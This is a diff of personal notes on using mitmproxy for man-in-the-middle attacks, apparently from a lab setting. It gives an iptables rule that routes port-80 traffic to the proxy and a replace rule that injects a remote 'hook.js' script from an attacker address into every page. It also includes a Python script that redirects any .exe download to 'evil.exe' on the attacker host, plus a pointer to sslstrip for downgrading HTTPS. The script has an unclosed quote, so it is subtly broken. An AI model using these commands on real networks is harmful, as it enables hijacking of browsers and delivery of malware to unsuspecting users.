@@ -7,8 +7,8 @@ mitmproxy.org/downloads
 127.0.0.1:8080
 
 # or setup redirect
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 ./mitmweb --transparent
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 # back to normal
 iptables -t nat --flush
 
@@ -20,22 +20,26 @@ iptables -t nat --flush
 
 
 
-# start through script
+# start through script, can run multiple script together
 # replace rule   :[filter]:"[code be replaced]":"[code replaced with]"
 ./mitmdump --transparent --replace :~bs:"</body>":"<script src="http://10.0.2.5:3000/hook.js"></script></body>"
-./mitmdump -s [.py]
+./mitmdump -s [script1.py] -s [script2.py] --transparent
 
 
-### .py script
+### .py script to change download .exe
 import mitmproxy
 
 def request(flow):
     print(flow.request.pretty_url)      # the url part of the request part of the packet
-    if flow.request.pretty_url.endswith(".exe") and flow.request.host != "10.0.2.5":      # if url ends with .exe
+    if flow.request.pretty_url.endswith(".exe") and flow.request.host != "10.0.2.5":      # if url ends with .exe, can add '#' to '.exe' in order to break loop
         flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.0.2.5/evil.exe})      # mitmproxy.http.HTTPResponse.make([http code], [content], [header])
-        
-    
+            
 def response(flow):
     pass
 
 ### end script
+
+# common used script examples   # /complex/sslstrip.py to downgrade https
+https://github.com/mitmproxy/mitmproxy/tree/v2.0.2/examples/
+
+
